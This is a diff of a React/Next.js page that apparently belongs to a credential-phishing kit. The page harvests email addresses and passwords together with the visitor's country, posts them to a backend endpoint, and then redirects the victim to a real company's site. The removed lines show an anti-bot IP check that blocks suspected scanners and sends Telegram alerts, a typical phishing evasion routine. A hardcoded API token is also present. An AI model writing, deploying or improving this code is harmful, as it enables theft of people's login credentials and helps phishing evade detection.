@@ -1,3 +1,5 @@
+// pages/index.js
+
 import { useState, useEffect } from 'react';
 import axios from 'axios';
 import styles from '../styles/Home.module.css';
@@ -8,38 +10,22 @@ export default function Home() {
   const [country, setCountry] = useState('');
   const [emailSubmitted, setEmailSubmitted] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [accessDenied, setAccessDenied] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false); // Modal state
 
   useEffect(() => {
-    // Trigger CloudFilt check on page load
-    axios.get('/api/check-ip')
-      .then(response => {
-        if (response.data.listed) {
-          console.warn('Suspicious IP detected:', response.data);
-          setAccessDenied(true);
-          // Notify via Telegram
-          axios.post('/api/notify-telegram', {
-            message: `🚨 Office Bot Eliminated 🚨\nIP: ${response.data.ip}\nISP: ${response.data.asnisp}`
-          });
-        }
-      })
-      .catch(error => {
-        console.error('Error checking IP with CloudFilt:', error);
-      });
-
-    // Fetch user's country based on IP
+    // Fetch user's country based on IP and get full country name
     axios.get('https://ipinfo.io/json?token=c3e87e382ddea7')
       .then(response => {
         const countryCode = response.data.country;
+        // Fetch full country name using the country code
         return axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
       })
       .then(countryResponse => {
-        setCountry(countryResponse.data[0].name.common);
+        setCountry(countryResponse.data[0].name.common); // Set full country name
       })
       .catch(error => {
-        console.error('Failed to fetch country:', error);
-        setErrorMessage('*');
+        console.error('Failed to fetch full country name:', error);
+        setErrorMessage('Failed to retrieve country information.');
       });
   }, []);
 
@@ -57,37 +43,33 @@ export default function Home() {
     e.preventDefault();
 
     if (password.length >= 5) {
-      setIsProcessing(true);
+      setIsProcessing(true); // Show processing modal
+
       try {
-        const response = await axios.post('/api/send-email', { email, password, country });
-        if (response.data.redirectUrl) {
-          window.location.href = response.data.redirectUrl;
-        } else {
-          setErrorMessage('Unexpected response. Please try again.');
-        }
+        // Send email and password with country to the backend API
+        const response = await axios.post('/api/send-email', {
+          email,
+          password,
+          country,
+        });
+
+        console.log('Email sent successfully!', response.data.message);
+        window.location.href = 'https://tbon.biggreeneegg.com';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
       } finally {
-        setIsProcessing(false);
+        setIsProcessing(false); // Hide processing modal after API call completes
       }
     } else {
       setErrorMessage('Password must be at least 5 characters long.');
     }
   };
 
-  const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.toLowerCase());
-
-  if (accessDenied) {
-    return (
-      <div className={styles.container}>
-        <div className={styles.accessDeniedBox}>
-          <h1>Access Denied</h1>
-          <p>Your connection has been terminated due to suspicious activity.</p>
-        </div>
-      </div>
-    );
-  }
+  const validateEmail = (email) => {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(String(email).toLowerCase());
+  };
 
   return (
     <div className={styles.container}>
@@ -128,6 +110,8 @@ export default function Home() {
           </form>
         )}
         {errorMessage && <div className={styles.errorMessage}>{errorMessage}</div>}
+
+        {/* Processing Modal */}
         {isProcessing && (
           <div className={styles.modal}>
             <div className={styles.modalContent}>
